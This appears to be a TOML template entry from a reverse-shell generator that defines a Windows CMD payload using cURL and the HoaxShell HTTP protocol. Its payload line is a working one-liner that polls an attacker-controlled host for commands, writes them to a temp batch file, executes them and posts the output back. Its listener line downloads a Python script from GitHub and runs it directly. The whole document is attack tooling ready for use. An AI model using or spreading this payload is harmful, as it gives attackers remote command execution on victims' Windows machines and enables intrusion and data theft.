id = "hoaxshell_cmd_curl"
name = "Windows CMD cURL"
os = "windows"
type = "hoaxshell"
proto = "http"
lang = "batch"
description = "Windows CMD reverse shell using cURL and HoaxShell HTTP."

payload = "@echo off&cmd /V:ON /C \"SET ip={{LHOST}}:{{LPORT}}&&SET sid=\"Authorization: eb6a44aa-8acc1e56-629ea455\"&&SET protocol=http://&&curl !protocol!!ip!/eb6a44aa -H !sid! > NUL && for /L %i in (0) do (curl -s !protocol!!ip!/8acc1e56 -H !sid! > !temp!\\cmd.bat & type !temp!\\cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!\\cmd.bat > !tmp!\\out.txt 2>&1) & curl !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!\\out.txt > NUL)) & timeout 1\" > NUL"

[listeners]
hoaxshell = "python3 -c \"$(curl -s https://raw.githubusercontent.com/t3l3machus/hoaxshell/main/revshells/hoaxshell-listener.py)\" -t http -p {{LPORT}}"
